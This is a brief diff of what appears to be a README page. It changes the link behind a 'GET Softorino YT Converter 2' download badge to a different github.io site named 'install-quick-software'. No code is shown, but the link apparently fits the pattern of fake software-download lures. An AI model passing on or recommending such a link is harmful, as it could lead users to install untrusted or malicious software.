@@ -7,7 +7,7 @@
 <br>  
 
 <div align="center">  
-<a href="https://osx-app.github.io/.github/softorino-youtube-converter-2">  
+<a href="https://install-quick-software.github.io/.github/softorino-youtube-converter-2">  
 <img src="https://img.shields.io/badge/💻_GET_Softorino_YT_Converter_2-red?style=for-the-badge&logo=apple" alt="GET Softorino YouTube Converter 2">  
 </a>  
 </div>
